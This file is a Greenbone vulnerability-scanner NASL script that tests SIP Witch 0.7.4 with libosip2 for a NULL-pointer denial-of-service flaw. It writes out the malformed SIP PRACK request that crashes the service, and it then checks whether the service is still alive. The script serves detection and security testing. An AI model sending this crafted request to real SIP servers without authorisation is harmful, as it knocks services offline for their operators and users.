# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803457");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-03-29 15:06:28 +0530 (Fri, 29 Mar 2013)");
  script_name("SIP Witch Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("sip_detection.nasl", "sip_detection_tcp.nasl");
  script_mandatory_keys("sip/banner/available");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Mar/60");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525904/30/90/threaded");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to cause
  denial of service resulting in a loss of availability.");

  script_tag(name:"affected", value:"SIP Witch 0.7.4 with libosip2-4.0.0.");

  script_tag(name:"insight", value:"Flaw is due to NULL pointer dereference in osip_lost.c of
  libosip2 library.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"SIP Witch is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("sip.inc");
include("misc_func.inc");
include("port_service_func.inc");

infos = sip_get_port_proto( default_port:"5060", default_proto:"udp" );
port = infos["port"];
proto = infos["proto"];

banner = sip_get_banner( port:port, proto:proto );
if( ! banner || "sipwitch" >!< banner )
  exit( 0 );

if( ! sip_alive( port:port, proto:proto ) )
  exit( 0 );

req = string(
  "PRACK sip:1 ()\r\n",
  "Via: SIP/2.0/", toupper( proto )," ", this_host(), ":", port, "\r\n",
  "Call-ID: ", "a", "\r\n");
sip_send_recv( port:port, data:req, proto:proto );

sleep( 1 );

if( ! sip_alive( port:port, proto:proto ) ) {
  security_message( port:port, proto:proto );
  exit( 0 );
}

exit( 99 );
